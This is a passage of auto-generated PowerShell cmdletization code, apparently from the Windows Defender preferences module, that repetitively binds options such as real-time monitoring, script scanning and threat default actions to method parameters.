[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisablePrivacyMode'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisablePrivacyMode'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RandomizeScheduleTaskTimes')) {\r\n          [object]$__cmdletization_value = ${RandomizeScheduleTaskTimes}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomizeScheduleTaskTimes'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomizeScheduleTaskTimes'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SchedulerRandomizationTime')) {\r\n          [object]$__cmdletization_value = ${SchedulerRandomizationTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SchedulerRandomizationTime'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SchedulerRandomizationTime'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableBehaviorMonitoring')) {\r\n          [object]$__cmdletization_value = ${DisableBehaviorMonitoring}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBehaviorMonitoring'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBehaviorMonitoring'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultVal"
"ueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableIntrusionPreventionSystem')) {\r\n          [object]$__cmdletization_value = ${DisableIntrusionPreventionSystem}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIntrusionPreventionSystem'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIntrusionPreventionSystem'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableIOAVProtection')) {\r\n          [object]$__cmdletization_value = ${DisableIOAVProtection}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIOAVProtection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIOAVProtection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableRealtimeMonitoring')) {\r\n          [object]$__cmdletization_value = ${DisableRealtimeMonitoring}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRealtimeMonitoring'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRealtimeMonitoring'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableScriptScanning')) {\r\n          [object]$__cmdletization_value = ${DisableScriptScanning}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScriptScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScriptScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableArchiveScanning')) {\r\n          [object]$__cmdletization_value = ${DisableArchiveScanning}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableArchiveScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableArchiveScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableCatchupFullScan')) {\r\n          [object]$__cmdletization_value = ${DisableCatchupFullScan}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupFullScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupFullScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableCatchupQuickScan')) {\r\n          [object]$__cmdletization_value = ${DisableCatchupQuickScan}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupQuickScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupQuickScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableEmailScanning')) {\r\n          [object]$__cmdletization_value = ${DisableEmailScanning}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableEmailScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableEmailScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableRemovableDriveScanning')) {\r\n          [object]$__cmdletization_value = ${DisableRemovableDriveScanning}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRemovableDriveScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRemovableDriveScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableRestorePoint')) {\r\n          [object]$__cmdletization_value = ${DisableRestorePoint}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRestorePoint'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRestorePoint'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableScanningMappedNetworkDrivesForFullScan')) {\r\n          [object]$__cmdletization_value = ${DisableScanningMappedNetworkDrivesForFullScan}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningMappedNetworkDrivesForFullScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningMappedNetworkDrivesForFullScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableScanningNetworkFiles')) {\r\n          [object]$__cmdletization_value = ${DisableScanningNetworkFiles}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningNetworkFiles'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningNetworkFiles'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ApplyDisableNetworkScanningToIOAV')) {\r\n          [object]$__cmdletization_value = ${ApplyDisableNetworkScanningToIOAV}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ApplyDisableNetworkScanningToIOAV'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } els"
"e {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ApplyDisableNetworkScanningToIOAV'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('UILockdown')) {\r\n          [object]$__cmdletization_value = ${UILockdown}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UILockdown'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UILockdown'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Ids')) {\r\n          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Ids}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Actions')) {\r\n          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Actions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('UnknownThreatDefaultAction')) {\r\n          [object]$__cmdletization_value = ${UnknownThreatDefaultAction}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UnknownThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UnknownThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('LowThreatDefaultAction')) {\r\n          [object]$__cmdletization_value = ${LowThreatDefaultAction}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LowThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LowThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ModerateThreatDefaultAction')) {\r\n          [object]$__cmdletization_value = ${ModerateThreatDefaultAction}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ModerateThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ModerateThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('HighThreatDefaultAction')) {\r\n          [object]$__cmdletization_value = ${HighThreatDefaultAction}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'HighThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'HighThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SevereThreatDefaultAction')) {\r\n          [object]$__cmdletization_value = ${SevereThreatDefaultAction}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SevereThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SevereThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Force')) {\r\n          [object]$__cmdletization_value = ${Force}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableBlockAtFirstSeen')) {\r\n          [object]$__cmdletization_value = ${DisableBlockAtFirstSeen}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBlockAtFirstSeen'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBlockAtFirstSeen'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('PUAProtection')) {\r\n          [object]$__cmdletization_value = ${PUAProtection}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PUAProtection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.PUAProtectionType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PUAProtection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.PUAProtectionType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('CloudBlockLevel')) {\r\n          [object]$__cmdle"
"tization_value = ${CloudBlockLevel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudBlockLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.CloudBlockLevelType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudBlockLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.CloudBlockLevelType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('CloudExtendedTimeout')) {\r\n          [object]$__cmdletization_value = ${CloudExtendedTimeout}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudExtendedTimeout'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudExtendedTimeout'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableNetworkProtection')) {\r\n          [object]$__cmdletization_value = ${EnableNetworkProtection}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableNetworkProtection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableNetworkProtection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableControlledFolderAccess')) {\r\n          [object]$__cmdletization_value = ${EnableControlledFolderAccess}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableControlledFolderAccess'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ControlledFolderAccessType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableControlledFolderAccess'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ControlledFolderAccessType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionOnlyExclusions')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionOnlyExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessAllowedApplications')) {\r\n          [object]$__cmdletization_value = 